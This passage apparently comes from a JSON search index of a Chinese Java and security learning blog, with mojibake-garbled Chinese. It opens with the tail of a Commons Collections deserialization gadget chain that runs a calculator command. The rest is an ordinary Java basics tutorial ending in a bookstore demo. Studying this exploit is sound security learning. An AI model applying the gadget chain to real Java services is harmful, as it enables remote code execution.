Object[]{null, new Object[0]} ), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;open -a calculator\u0026#34;}), }; Transformer transformerChain = new ChainedTransformer(fakeTransformers); Hashtable innerTable = new Hashtable(); // Map innerMap = new HashMap(); Map outerTable = LazyMap.decorate(innerTable, transformerChain); TiedMapEntry tme = new TiedMapEntry(outerTable, \u0026#34;Yuy0ung\u0026#34;); Map evilMap = new HashMap(); evilMap.put(tme,\u0026#34;Yuy1ung\u0026#34;); outerTable.remove(\u0026#34;Yuy0ung\u0026#34;); Field f = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); f.setAccessible(true); f.set(transformerChain,transformers); serialize(evilMap); unserialize(\u0026#34;ser.bin\u0026#34;); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.bin\u0026#34;)); oos.writeObject(obj); } public static Object unserialize(String fileName) throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(fileName)); Object obj = ois.readObject(); return obj; } } æˆåŠŸè§¦å‘å‘½ä»¤æ‰§è¡Œï¼š\n"
    }
,
    {
        "title": "javaåŸºç¡€demo",
        "link": "/My-Knowlege-Database/blog/java%E5%BC%80%E5%8F%91/java%E5%9F%BA%E7%A1%80demo/",
        "content": "javaåŸºç¡€demo è®°å½•åŸºç¡€å­¦ä¹ æ—¶å†™çš„demoï¼Œå¤ä¹ åŸºç¡€\nhelloworld package com.yuy0ung.test01; /** * @author Yuy0ung */ public class HelloWorld4 { public static void main(String[] args) { System.out.println(\u0026#34;hello world\u0026#34;); System.out.println(\u0026#34;hello world\u0026#34;); } } å˜é‡ package com.yuy0ung.test01; public class TestVar { public static void main(String[] args) { //å®šä¹‰å¹´é¾„å˜é‡ int age; //åŒæ—¶å®šä¹‰å¤šä¸ª int a,b; //èµ‹å€¼ age = 18; age = 19; age = 18 + 19; //å˜é‡å®šä¹‰+èµ‹å€¼ int age1 = 19; int age2 = 18,age3 = 20; int age4,age5 = 30;//è¿™é‡Œage5è¢«èµ‹å€¼ä½†age4æ²¡æœ‰ //å˜é‡ä½¿ç”¨ System.out.println(age); System.out.println(age+10); System.out.println(age+age3); } } åŸºæœ¬æ•°æ®ç±»å‹ package com.yuy0ung.test01; public class TestType { public static void main(String[] args) { //æ•´æ•° byte a = 10;//-128~127 short b = 20;//æ­£è´Ÿ3w int c = 30;//æ­£è´Ÿ21äº¿ long d = 4000000L;///å¤§å¾—å¾ˆ...ï¼ˆè¶…è¿‡intèŒƒå›´åŠ Lï¼‰ //æµ®ç‚¹ float e = 3.14f;//ç»“å°¾è¦f double f = 3.14; //å­—ç¬¦ char g = \u0026#39;Y\u0026#39;;//å•å¼•å·æ‹¬èµ·æ¥çš„å•ä¸ªå­—ç¬¦ System.out.println(\u0026#34;Yuy0ung\u0026#34;);//å­—ç¬¦ä¸²æ˜¯å¤šä¸ªå­—ç¬¦æ‹¼æ¥ //å¸ƒå°” boolean h = true; } } ç®—æœ¯è¿ç®—ç¬¦ package com.yuy0ung.test01; public class TestOpe { public static void main(String[] args) { System.out.println(+10); System.out.println(1+2); int num = 10; //ä»å·¦åˆ°å³è¿ç®—ï¼ŒåŒ…æ‹¬ç±»å‹ System.out.println(\u0026#34;è¿™æ˜¯ä¸€ä¸ªæ•°\u0026#34;+num); System.out.println(500+20+\u0026#34;Yuy0ung\u0026#34;); System.out.println(\u0026#34;Yuy0ung\u0026#34;+5+20); num++;//è‡ªå¢ int a = 0; ++a;//è‡ªå¢ System.out.println(num); System.out.println(a); int b = 0; int c = 0; System.out.println(b++);//å…ˆè¿ç®—åè‡ªå¢ System.out.println(b); System.out.println(++c);//å…ˆè‡ªå¢åè¿ç®— } } èµ‹å€¼è¿ç®—ç¬¦ package com.yuy0ung.test01; public class TestOpe2 { public static void main(String[] args) { //èµ‹å€¼ int num1 = 1; int num2 = 2; int num3 = 10 + 30; //æ±‚å’Œ int sum = 0; sum = sum + num1; sum = sum + num2; sum += num3; System.out.println(\u0026#34;å’Œï¼š\u0026#34; + sum); } } å…³ç³»è¿ç®—ç¬¦ package com.yuy0ung.test01; public class TestOpe3 { public static void main(String[] args) { //å…³ç³»è¿ç®—ç¬¦ System.out.println(1 == 2); System.out.println(1 == 1); //é€»è¾‘è¿ç®—ç¬¦ System.out.println(true\u0026amp;\u0026amp;true); System.out.println(true\u0026amp;\u0026amp;false); System.out.println(false\u0026amp;\u0026amp;false); System.out.println(false\u0026amp;\u0026amp;true); System.out.println(false||false); System.out.println(true||true); System.out.println(true||false); } } æµç¨‹æ§åˆ¶ if package com.yuy0ung.test02; public class TestIf01 { public static void main(String[] args) { int num = 18; if (num \u0026gt; 10) { System.out.println(\u0026#34;å¤§äº10\u0026#34;); } if (num \u0026lt; 10) { System.out.println(\u0026#34;å°äº10\u0026#34;); } else { System.out.println(\u0026#34;å¤§äº10\u0026#34;); } if (num \u0026lt; 18) { System.out.println(\u0026#34;å°äº18\u0026#34;); } else if (num \u0026gt; 18) { System.out.println(\u0026#34;å¤§äº18\u0026#34;); } else { System.out.println(\u0026#34;ç­‰äº18\u0026#34;); } } } while package com.yuy0ung.test02; public class TestWhile { public static void main(String[] args) { int i = 1; while (i \u0026lt; 10) { i++; System.out.println(i); } } } for package com.yuy0ung.test02; public class TestFor { public static void main(String[] args) { int a = 10; for (int i = 0; i \u0026lt; 10; i++) { System.out.println(a); } } } æ–¹æ³•\u0026amp;é‡è½½ package com.yuy0ung.test04; public class TestMethod { //æå–ä¸€ä¸ªæ–¹æ³•ï¼Œç”¨äºæ±‚å’Œ public static int addNum(int a, int b) { int c = a + b; return c; } //æ–¹æ³•é‡è½½ï¼Œæ–¹æ³•åç›¸åŒï¼Œå½¢å‚åˆ—è¡¨ä¸åŒ public static void addNum(int a, int b, int c) { System.out.println(a+b+c); } public static void main(String[] args) { int sum = addNum(1, 2); System.out.println(sum); System.out.println(addNum(4, 5)); addNum(6, 7,8); } } æ•°ç»„ package com.yuy0ung.test05; public class TestArray { public static void main(String[] args) { //int ä¸ºä¾‹ int[] arr;//å®šä¹‰ arr = new int[4];//åˆ›å»ºé•¿åº¦ä¸ºå›› //åˆ›å»ºåæœ‰é»˜è®¤å€¼0 //èµ‹å€¼ arr[0] = 1; arr[1] = 2; arr[2] = 3; arr[3] = 4; //ä½¿ç”¨ System.out.println(arr[0]); System.out.println(arr[1] + 3); //éå† for (int i = 0; i \u0026lt; arr.length; i++) { System.out.println(\u0026#34;ç¬¬\u0026#34;+(i+1)+\u0026#34;ä¸ªå…ƒç´ ä¸ºï¼š\u0026#34;+arr[i]); } //for-each for (int num : arr) { System.out.println(num); } } } ç»ƒä¹  ç¿»è½¬æ•´æ•° ç»™å®šä¸€ä¸ª 32 ä½æœ‰ç¬¦å·æ•´æ•°ï¼Œå°†æ•´æ•°ä¸­çš„æ•°å­—è¿›è¡Œåè½¬ã€‚\nç¤ºä¾‹ 1:\nè¾“å…¥: 123 è¾“å‡º: 321 ç¤ºä¾‹ 2:\nè¾“å…¥: -123 è¾“å‡º: -321 å¦‚æœåè½¬åæ•´æ•°æº¢å‡ºé‚£ä¹ˆå°±è¿”å› 0ã€‚\ndemoï¼š\npublic class ReverseInteger { public static void main(String[] args) { int x = 123; int y = -123; System.out.println(reverse(x)); System.out.println(reverse(y)); } //å¦‚æœåè½¬åæ•´æ•°æº¢å‡ºé‚£ä¹ˆå°±è¿”å›0 public static int reverse(int x) { int rev = 0; while (x != 0) { int pop = x % 10; x /= 10; // æ£€æŸ¥æº¢å‡ºï¼šå¦‚æœ rev \u0026gt; Integer.MAX_VALUE/10 æˆ– rev \u0026lt; Integer.MIN_VALUE/10ï¼Œåˆ™ä¼šæº¢å‡º if (rev \u0026gt; Integer.MAX_VALUE / 10 || (rev == Integer.MAX_VALUE / 10 \u0026amp;\u0026amp; pop \u0026gt; Integer.MAX_VALUE % 10)) return 0; if (rev \u0026lt; Integer.MIN_VALUE / 10 || (rev == Integer.MIN_VALUE / 10 \u0026amp;\u0026amp; pop \u0026lt; Integer.MIN_VALUE % 10)) return 0; rev = rev * 10 + pop; } return rev; } } é¢å‘å¯¹è±¡ åŸºç¡€åˆ›å»º Personç±»ï¼š\npackage com.yuy0ung.test06; /** * äººç±» */ public class Person { //ç‰¹æ€§ï¼ˆå±æ€§ï¼‰ String name; int age; double height; //è¡Œä¸ºï¼ˆæ–¹æ³•ï¼‰ //å­¦ä¹ çš„æ–¹æ³• public void study() { System.out.println(\u0026#34;æˆ‘å­¦ï¼Œæˆ‘practiceï¼Œæˆ‘æ¯å¤©åˆ°æ™šå°±é…·é…·å­¦ï¼Œæˆ‘éšæ—¶åº“åº“ç»ƒï¼\u0026#34;); } } Testæµ‹è¯•ç±»ï¼š\npackage com.yuy0ung.test06; /** * æµ‹è¯•ç±» */ public class Test { public static void main(String[] args) { //åˆ›å»ºPersonçš„å¯¹è±¡ Person p1 = new Person(); //å¯¹å±æ€§èµ‹å€¼ p1.name = \u0026#34;6s6\u0026#34;; p1.age = 18; p1.height = 170.3; //è¯»å–å±æ€§ System.out.println(p1.name); System.out.println(p1.age); System.out.println(p1.height); //è°ƒç”¨æ–¹æ³•--å­¦ä¹  p1.study(); } } æ„é€ å™¨ å°½é‡ä¿æŒç©ºæ„é€ å™¨å­˜åœ¨ï¼ˆå³ä½¿é»˜è®¤æœ‰éšå¼åˆ›å»ºäº†æ„é€ å™¨ï¼‰\nPersonç±»\npackage com.yuy0ung.test06; /** * äººç±» */ public class Person { //ç‰¹æ€§ï¼ˆå±æ€§ï¼‰ String name; int age; double height; //è¡Œä¸ºï¼ˆæ–¹æ³•ï¼‰ //å­¦ä¹ çš„æ–¹æ³• public void study() { System.out.println(\u0026#34;æˆ‘å­¦ï¼Œæˆ‘practiceï¼Œæˆ‘æ¯å¤©åˆ°æ™šå°±é…·é…·å­¦ï¼Œæˆ‘éšæ—¶åº“åº“ç»ƒï¼\u0026#34;); } //alt+insertå¿«é€Ÿæ·»åŠ æ„é€ å™¨ //æ˜¾å¼ç¼–å†™æ„é€ å™¨ï¼Œä¸å®šä¹‰è¿”å›å€¼ public Person(){ System.out.println(\u0026#34;111\u0026#34;); } //é‡è½½æ„é€ å™¨ public Person(String name, int age, double height) { this.name = name; this.age = age; this.height = height; } } Test02æµ‹è¯•ç±»ï¼š\npackage com.yuy0ung.test06; public class Test02 { public static void main(String[] args) { //åˆ›å»ºPersonå¯¹è±¡ Person p = new Person(); p.name = \u0026#34;Yuy0ung\u0026#34;; p.age = 18; p.height = 174.2; Person p2 = new Person(\u0026#34;Yuy0ungçš„gf\u0026#34;, 18, 164.2); System.out.println(p2.name); } } å°è£… Girlç±»\npackage com.yuy0ung.Test07; public class Girl { //å±æ€§ï¼š private int age; //ç»™ageæä¾›èµ‹å€¼å’Œè¯»å–å€¼çš„æ–¹æ³• public void setAge(int age) { if (age \u0026gt; 30) { this.age = 18; } else { this.age = age; } } public int getAge() { return age; } } Testæµ‹è¯•ç±»\npackage com.yuy0ung.Test07; public class Test { public static void main(String[] args) { //åˆ›å»ºå¯¹è±¡ Girl g = new Girl(); g.setAge(28); System.out.println(g.getAge()); } } Personç±»ï¼š\npackage com.yuy0ung.Test07; public class Person { private int age; private String name; private double height; //alt+insertå¿«é€Ÿç”Ÿæˆgetterå’Œsetter public int getAge() { return age; } public String getName() { return name; } public double getHeight() { return height; } public void setAge(int age) { this.age = age; } public void setName(String name) { this.name = name; } public void setHeight(double height) { this.height = height; } } ç»§æ‰¿ çˆ¶ç±»Person\npackage com.yuy0ung.test08; public class Person { //çˆ¶ç±»å…¬å…±çš„å±æ€§ private String name; private int age; private double height; //æ„é€ å™¨ï¼Œmacæ˜¯cmd+n public String getName() { return name; } public int getAge() { return age; } public double getHeight() { return height; } public void setName(String name) { this.name = name; } public void setAge(int age) { this.age = age; } public void setHeight(double height) { this.height = height; } //åƒé¥­ public void eat() { System.out.println(\u0026#34;æˆ‘åƒåƒåƒ\u0026#34;); } //è¯´è¯ public void speak() { System.out.println(\u0026#34;æˆ‘è¯´è¯´è¯´\u0026#34;); } //ç¡è§‰ public void sleep() { System.out.println(\u0026#34;zzzZZZ\u0026#34;); } } å­ç±»Student\npackage com.yuy0ung.test08; public class Student extends Person { //ç»§æ‰¿çˆ¶ç±»Person //å®šä¹‰é¢å¤–å±æ€§ã€æ–¹æ³• private int sno; public int getSno() { return sno; } public void setSno(int sno) { this.sno = sno; } public void Study() { System.out.println(\u0026#34;æˆ‘å­¦å­¦å­¦\u0026#34;); } } æµ‹è¯•ç±»Testï¼š\npackage com.yuy0ung.test08; public class Test { public static void main(String[] args) { //å®šä¹‰å­ç±»å¯¹è±¡ Student s = new Student(); s.setSno(2023122068); s.setAge(18); s.setHeight(174.4); s.setName(\u0026#34;Yuy0ung\u0026#34;); s.Study(); s.eat(); s.sleep(); s.speak(); } } å®ç°ä»£ç å¤ç”¨ï¼Œå¤šæ€çš„åŸºç¡€\næ–¹æ³•çš„é‡å†™ Personç±»ï¼š\npackage com.yuy0ung.test09; public class Person { public void eat() { System.out.println(\u0026#34;æˆ‘åƒåƒåƒ\u0026#34;); } } ç»§æ‰¿çš„å­¦ç”Ÿç±»ï¼š\npackage com.yuy0ung.test09; public class Student extends Person { public void eat() { System.out.println(\u0026#34;æˆ‘ä¸ä»…åƒï¼Œæˆ‘è¿˜å–å¿«å“‰å¿«å“‰é…’\u0026#34;); } } æµ‹è¯•ç±»Testï¼š\npackage com.yuy0ung.test09; public class Test { public static void main(String[] args) { //åˆ›å»ºå­¦ç”Ÿå¯¹è±¡ Student s = new Student(); s.eat(); } } æ–¹æ³•é‡è½½ï¼šåœ¨åŒä¸€ç±»ä¸­ï¼ŒåŒä¸€æ–¹æ³•ï¼Œä¸åŒå½¢å‚åˆ—è¡¨ æ–¹æ³•é‡å†™ï¼šçˆ¶å­ç±»ä¸­ï¼Œå­ç±»å¯¹çˆ¶ç±»çš„æ–¹æ³•å†…å®¹è¿›è¡Œé‡å†™ å¤šæ€ ç”¨äºæé«˜ä»£ç æ‰©å±•æ€§ï¼ŒæŒ‡çš„æ˜¯æ–¹æ³•çš„å¤šæ€è€Œä¸æ˜¯å±æ€§ï¼Œå°±æ˜¯ä¸åŒå¯¹è±¡çš„åŒåè¡Œä¸ºçš„è¡¨ç°çŠ¶æ€ä¸åŒ\nå‰æï¼š\nç»§æ‰¿ é‡å†™ çˆ¶ç±»å¼•ç”¨äº†æŒ‡å‘å­ç±»çš„å¯¹è±¡ï¼ˆå¦‚æ­¤è°ƒç”¨å­ç±»é‡å†™çš„æ–¹æ³•ï¼‰ å¥³å­©Girlç±»ï¼š\npackage com.yuy0ung.test10; public class Girl { //ç© public void play(Animal animal) { animal.shout(); } } çˆ¶ç±»Animalï¼š\npackage com.yuy0ung.test10; public class Animal { //å« public void shout() { System.out.println(\u0026#34;æˆ‘å«\u0026#34;); } } å­ç±»1ï¼ŒCatï¼š\npackage com.yuy0ung.test10; public class Cat extends Animal { //é‡å†™ public void shout() { System.out.println(\u0026#34;å–µï½\u0026#34;); } //æŠ“æŒ  public void scratch() { System.out.println(\u0026#34;æŒ ä½ ï¼\u0026#34;); } } å­ç±»2ï¼ŒDogï¼š\npackage com.yuy0ung.test10; public class Dog extends Animal { //é‡å†™ public void shout() { System.out.println(\u0026#34;æ±ªæ±ª\u0026#34;); } //ä¿å®‰(^_^) public void guard() { System.out.println( \u0026#34;æˆ‘æ­£åœ¨çœ‹å®¶æŠ¤é™¢...\u0026#34;); } } å¼‚å¸¸å¤„ç† tryã€catchã€finally package com.yuy0ung.test11; public class Test01 { public static void main(String[] args) { try { //ä¸¤ä¸ªæ•°æ±‚å•† int num1 = 12; int num2 = 0; System.out.println(\u0026#34;å•†ï¼š\u0026#34; + num1 / num2); } catch (Exception ex) { System.out.println(\u0026#34;ç¨‹åºé”™è¯¯\u0026#34;); } finally { System.out.println(\u0026#34;å§‹ç»ˆéƒ½ä¼šæ‰§è¡Œfinally\u0026#34;); } } } Throwã€throws package com.yuy0ung.test11; public class Test02 { public static void main(String[] args) throws Exception { devide(); } //ä¸¤æ•°ç›¸å¤„çš„æ–¹æ³• public static void devide() throws Exception { int num1 = 12; int num2 = 0; if (num2 == 0) { //äººä¸ºåˆ¶é€ å¼‚å¸¸ // try { // throw new Exception(); // } catch (Exception e) { // System.out.println(\u0026#34;è¿™é‡Œç”¨try-catchå¼‚å¸¸å¤„ç†\u0026#34;); // } throw new Exception(); }else { System.out.println(\u0026#34;å•†ï¼š\u0026#34; + num1 / num2); } } } Throwåœ¨æ–¹æ³•å†…éƒ¨ï¼Œthrowsåœ¨æ–¹æ³•å£°æ˜å¤„\nthrow + å¼‚å¸¸å¯¹è±¡ï¼Œthrows + å¼‚å¸¸ç±»å‹\nthrowï¼šå¼‚å¸¸å‡ºç°çš„æºå¤´ï¼Œåˆ¶é€ å¼‚å¸¸çš„åœ°æ–¹ï¼›throwsï¼šåœ¨æ–¹æ³•å£°æ˜å¤„å£°æ˜å¯èƒ½çš„å¼‚å¸¸ï¼Œè°ƒç”¨è€…è¦ä¹ˆè‡ªå·±å¤„ç†ï¼Œè¦ä¹ˆå‘å¤–æŠ›å‡º\né›†åˆ ArrayList package com.yuy0ung.test12; import java.util.ArrayList; public class Test { public static void main(String[] args) { //å®šä¹‰ä¸€ä¸ªé›†åˆ ArrayList list = new ArrayList(); System.out.println(list); //å¢åŠ å…ƒç´  list.add(\u0026#34;Yuy0ung\u0026#34;); list.add(\u0026#34;Yuy1ung\u0026#34;); list.add(\u0026#34;Yuy2ung\u0026#34;); list.add(\u0026#34;Yuy3ung\u0026#34;); System.out.println(list); //åˆ é™¤ list.remove(\u0026#34;Yuy1ung\u0026#34;); System.out.println(list); //æ”¹ list.set(0, \u0026#34;Yuy4ung\u0026#34;); System.out.println(list); //æŸ¥çœ‹ System.out.println(list.get(2)); //éå† for(int i = 0;i \u0026lt; list.size();i++) { System.out.println(list.get(i)); } } } ä¹¦åº—demo ä½œä¸ºå¿«é€Ÿå¤ä¹ äº†javaåŸºç¡€çš„ä¸€ç‚¹å°å®è·µ\nèœå• é¦–å…ˆå®Œæˆè„šæœ¬çš„èœå•æ ï¼Œç”¨äºå‘ˆç°å’Œé€‰æ‹©å„ç§åŠŸèƒ½ç‚¹ï¼š\npackage com.yuy0ung.test13; import java.util.Scanner; import static javafx.application.Platform.exit; public class Test { public static void main(String[] args) { //æ‰“å°èœå• while(true) { System.out.println(\u0026#34;è¿™é‡Œæ˜¯Yuy0ungçš„ä¹¦åº—\u0026#34;); System.out.println(\u0026#34;1.å±•ç¤ºä¹¦ç±\u0026#34;); System.out.println(\u0026#34;2.ä¸Šæ¶å›¾ä¹¦\u0026#34;); System.out.println(\u0026#34;3.ä¸‹æ¶å›¾ä¹¦\u0026#34;); System.out.println(\u0026#34;4.é€€å‡ºç¨‹åº\u0026#34;); System.out.println(\u0026#34;è¯·è¾“å…¥æƒ³è¦ä½¿ç”¨çš„åŠŸèƒ½åºå·\u0026#34;); //é”®ç›˜å½•å…¥ï¼Œä½¿ç”¨scannerç±» Scanner scanner = new Scanner(System.in); //å½•å…¥åºå· int choice = scanner.nextInt(); if (choice == 1) { System.out.println(\u0026#34;------å±•ç¤ºä¹¦ç±:\u0026#34;); } else if (choice == 2) { System.out.println(\u0026#34;------ä¸Šæ¶å›¾ä¹¦:\u0026#34;); } else if (choice == 3) { System.out.println(\u0026#34;------ä¸‹æ¶å›¾ä¹¦:\u0026#34;); } else if (choice == 4) { System.out.println(\u0026#34;------é€€å‡º\u0026#34;); break; } } } } åŠŸèƒ½ç‚¹å®Œå–„ åˆ›å»ºä¸€ä¸ªä¹¦ç±Bookç±»ï¼š\npackage com.yuy0ung.test13; public class Book { //å±æ€§ private int bId; private String bName; private String bAuthor; public int getbId() { return bId; } public String getbName() { return bName; } public String getbAuthor() { return bAuthor; } public void setbId(int bId) { this.bId = bId; } public void setbName(String bName) { this.bName = bName; } public void setbAuthor(String bAuthor) { this.bAuthor = bAuthor; } public Book(int bId, String bName, String bAuthor) { this.bId = bId; this.bName = bName; this.bAuthor = bAuthor; } public Book() { } } ç„¶åå®Œå–„Testæ–¹æ³•ï¼š\npackage com.yuy0ung.test13; import java.util.ArrayList; import java.util.Scanner; import static javafx.application.Platform.exit; public class Test { public static void main(String[] args) { ArrayList books = new ArrayList();//ç”¨äºå­˜å‚¨ä¹¦ç±çš„æ•°ç»„ //æ‰“å°èœå• while(true) { System.out.println(\u0026#34;è¿™é‡Œæ˜¯Yuy0ungçš„ä¹¦åº—\u0026#34;); System.out.println(\u0026#34;1.å±•ç¤ºä¹¦ç±\u0026#34;); System.out.println(\u0026#34;2.ä¸Šæ¶å›¾ä¹¦\u0026#34;); System.out.println(\u0026#34;3.ä¸‹æ¶å›¾ä¹¦\u0026#34;); System.out.println(\u0026#34;4.é€€å‡ºç¨‹åº\u0026#34;); System.out.println(\u0026#34;è¯·è¾“å…¥æƒ³è¦ä½¿ç”¨çš„åŠŸèƒ½åºå·\u0026#34;); //é”®ç›˜å½•å…¥ï¼Œä½¿ç”¨scannerç±» Scanner scanner = new Scanner(System.in); //å½•å…¥åºå· int choice = scanner.nextInt(); if (choice == 1) { System.out.println(\u0026#34;------å±•ç¤ºä¹¦ç±:\u0026#34;); for(int i = 0; i \u0026lt; books.size(); i++) { Book book = (Book) books.get(i); System.out.println(book.getbId()+\u0026#34;---\u0026#34;+book.getbName()+\u0026#34;---\u0026#34;+book.getbAuthor()); } } else if (choice == 2) { System.out.println(\u0026#34;------ä¸Šæ¶å›¾ä¹¦:\u0026#34;); System.out.println(\u0026#34;è¯·è¾“å…¥ä¹¦ç±ç¼–å·ï¼š\u0026#34;); int bId = scanner.nextInt(); System.out.println(\u0026#34;è¯·è¾“å…¥ä¹¦ç±åç§°\u0026#34;); String bName = scanner.next(); System.out.println(\u0026#34;è¯·è¾“å…¥ä¹¦ç±ä½œè€…\u0026#34;); String bAuthor = scanner.next(); //åˆ›å»ºä¹¦ç±å¯¹è±¡ Book book = new Book(bId, bName, bAuthor); books.add(book);//æ·»åŠ ä¹¦ç±è¿›å…¥é›†åˆ } else if (choice == 3) { System.out.println(\u0026#34;------ä¸‹æ¶å›¾ä¹¦:\u0026#34;); System.out.println(\u0026#34;è¾“å…¥åˆ é™¤ä¹¦ç±ç¼–å·\u0026#34;); int delId = scanner.nextInt(); //åˆ é™¤ for(int i = 0; i \u0026lt; books.size(); i++) { Book book = (Book) books.get(i); if(book.getbId() == delId) { books.remove(i); } } } else if (choice == 4) { System.out.println(\u0026#34;------é€€å‡º\u0026#34;); break; } } } } å®Œæˆ\nI/Oæµ è¾“å…¥è¾“å‡ºï¼ˆç›¸å¯¹äºç¨‹åºè€Œè¨€ï¼‰\næµçš„ç±»å‹å¾ˆå¤šï¼š\nå¤§åŒå°å¼‚\næ–‡ä»¶å­—ç¬¦è¾“å…¥æµ ä»txtè¯»å­—ç¬¦ä¸²\npackage com.yuy0ung.test14; import java.io.File; import java.io.FileNotFoundException; import java.io.FileReader; import java.io.IOException; public class Test01 { public static void main(String[] args) throws IOException { //å¯¹æ–‡ä»¶è¿›è¡Œå°è£…ä¸ºFileç±»å¯¹è±¡ File file = new File(\u0026#34;/Users/yuy0ung/1.txt\u0026#34;); //è¾“å…¥è¾“å‡ºï¼ˆå­—ç¬¦ï¼‰æµ FileReader fr = new FileReader(file); //è¯»,å¾ªç¯ int n1 = fr.read(); while (n1 != -1) { System.out.println(n1); n1 = fr.read(); } //å…³é—­æµ fr.close(); } } æ–‡ä»¶å­—ç¬¦è¾“å‡ºæµ å­—ç¬¦ä¸²å†™å…¥æ–‡ä»¶\npackage com.yuy0ung.test14; import java.io.File; import java.io.FileWriter; import java.io.IOException; public class Test02 { public static void main(String[] args) throws IOException { String str = \u0026#34;Yuy0ungä½ å¥½\u0026#34;; //æ–‡ä»¶ File file = new File(\u0026#34;/Users/yuy0ung/2.txt\u0026#34;); //å­—ç¬¦è¾“å‡ºæµ FileWriter fw = new FileWriter(file); //è¾“å‡º fw.write(str); //å…³é—­ fw.close(); } } ä¹¦åº—demo2 ä¸Šé¢çš„ä¹¦åº—ä½¿ç”¨æ•°ç»„å­˜å‚¨æ•°æ®ï¼Œä½†æ˜¯è¿™æ ·æ²¡æœ‰åŠæ³•æ°¸ä¹…ä¿å­˜ï¼Œç¨‹åºä¸€æ—¦å…³é—­ï¼Œæ•°æ®å°±ä¼šä¸¢å¤±ï¼Œæ­¤æ—¶å°±å¯ä»¥è¿ç”¨I/Oæµå°†æ–‡ä»¶æ•°æ®å­˜å‚¨è¿›æ–‡ä»¶\né€‰å®šå¯¹è±¡æµï¼š\nFileInputStream FileOutputStream ObjectInputStream ObjectOutputStream è¿˜éœ€è¦åºåˆ—åŒ–ï¼Œå®ç°äº†Serializableæ¥å£æ‰å…·å¤‡å°†å¯¹è±¡è¾“å‡ºåˆ°æ–‡ä»¶çš„èƒ½åŠ›ï¼š\nImplements Serializable\nTestç±»ï¼š\npackage com.yuy0ung.test15; import java.io.*; import java.util.ArrayList; import java.util.Scanner; public class Test { public static void main(String[] args) throws IOException, ClassNotFoundException { //æ‰“å°èœå• while(true) { System.out.println(\u0026#34;è¿™é‡Œæ˜¯Yuy0ungçš„ä¹¦åº—\u0026#34;); System.out.println(\u0026#34;1.å±•ç¤ºä¹¦ç±\u0026#34;); System.out.println(\u0026#34;2.ä¸Šæ¶å›¾ä¹¦\u0026#34;); System.out.println(\u0026#34;3.ä¸‹æ¶å›¾ä¹¦\u0026#34;); System.out.println(\u0026#34;4.é€€å‡ºç¨‹åº\u0026#34;); System.out.println(\u0026#34;è¯·è¾“å…¥æƒ³è¦ä½¿ç”¨çš„åŠŸèƒ½åºå·\u0026#34;); //é”®ç›˜å½•å…¥ï¼Œä½¿ç”¨scannerç±» Scanner scanner = new Scanner(System.in); //å½•å…¥åºå· int choice = scanner.nextInt(); if (choice == 1) { System.out.println(\u0026#34;------å±•ç¤ºä¹¦ç±:\u0026#34;); //ä»æ–‡ä»¶è¯»å– File file = new File(\u0026#34;/Users/yuy0ung/books.txt\u0026#34;); //åˆ¤æ–­æ–‡ä»¶æ˜¯å¦å­˜åœ¨ if(file.exists() == true) { //å­˜åœ¨ //è¾“å…¥æµ FileInputStream fis = new FileInputStream(file); ObjectInputStream ois = new ObjectInputStream(fis); //è¯»å–é›†åˆ ArrayList books = (ArrayList)(ois.readObject()); for(int i = 0; i \u0026lt; books.size(); i++) { Book book = (Book) books.get(i); System.out.println(book.getbId()+\u0026#34;---\u0026#34;+book.getbName()+\u0026#34;---\u0026#34;+book.getbAuthor()); } }else { System.out.println(\u0026#34;æœªä¸Šæ–°ä¹¦ç±ï¼Œè¯·å…ˆä¸Šæ–°ä¹¦ç±\u0026#34;); } } else if (choice == 2) { System.out.println(\u0026#34;------ä¸Šæ¶å›¾ä¹¦:\u0026#34;); System.out.println(\u0026#34;è¯·è¾“å…¥ä¹¦ç±ç¼–å·ï¼š\u0026#34;); int bId = scanner.nextInt(); System.out.println(\u0026#34;è¯·è¾“å…¥ä¹¦ç±åç§°\u0026#34;); String bName = scanner.next(); System.out.println(\u0026#34;è¯·è¾“å…¥ä¹¦ç±ä½œè€…\u0026#34;); String bAuthor = scanner.next(); //åˆ›å»ºä¹¦ç±å¯¹è±¡ Book book = new Book(bId, bName, bAuthor); //ä»æ–‡ä»¶è¯»å– File file = new File(\u0026#34;/Users/yuy0ung/books.txt\u0026#34;); //åˆ¤æ–­æ–‡ä»¶æ˜¯å¦å­˜åœ¨ if(file.exists() == true) { //å­˜åœ¨ //è¾“å…¥æµ FileInputStream fis = new FileInputStream(file); ObjectInputStream ois = new ObjectInputStream(fis); //è¯»å–é›†åˆ ArrayList books = (ArrayList)(ois.readObject()); //è¿½åŠ ä¹¦ç± books.add(book); //å†™å…¥æ–‡ä»¶ FileOutputStream fos = new FileOutputStream(file); ObjectOutputStream oos = new ObjectOutputStream(fos); //å†™å‡º oos.writeObject(books); //å…³é—­æµ oos.close(); }else { ArrayList books = new ArrayList();//ç”¨äºå­˜å‚¨ä¹¦ç±çš„æ•°ç»„ books.add(book);//æ·»åŠ ä¹¦ç±è¿›å…¥é›†åˆ FileOutputStream fos = new FileOutputStream(file); ObjectOutputStream oos = new ObjectOutputStream(fos); //å†™å‡º oos.writeObject(books); //å…³é—­æµ oos.close(); } } else if (choice == 3) { System.out.println(\u0026#34;------ä¸‹æ¶å›¾ä¹¦:\u0026#34;); System.out.println(\u0026#34;è¾“å…¥åˆ é™¤ä¹¦ç±ç¼–å·\u0026#34;); int delId = scanner.nextInt(); //è¯»å– File file = new File(\u0026#34;/Users/yuy0ung/books.txt\u0026#34;); //è¾“å…¥æµ FileInputStream fis = new FileInputStream(file); ObjectInputStream ois = new ObjectInputStream(fis); //è¯»å–é›†åˆ ArrayList books = (ArrayList)(ois.readObject()); //åˆ é™¤ for(int i = 0; i \u0026lt; books.size(); i++) { Book book = (Book) books.get(i); if(book.getbId() == delId) { books.remove(i); } } //å†™å…¥ FileOutputStream fos = new FileOutputStream(file); ObjectOutputStream oos = new ObjectOutputStream(fos); //å†™å‡º oos.writeObject(books); //å…³é—­æµ oos.close(); } else if (choice == 4) { System.out.println(\u0026#34;------é€€å‡º\u0026#34;); break; } } } } ç»™Bookç±»åŠ ä¸Šserializableæ¥å£ï¼š\npackage com.yuy0ung.test15; import java.io.Serializable; public class Book implements Serializable { //å±æ€§ private int bId; private String bName; private String bAuthor; public int getbId() { return bId; } public String getbName() { return bName; } public String getbAuthor() { return bAuthor; } public void setbId(int bId) { this.bId = bId; } public void setbName(String bName) { this.bName = bName; } 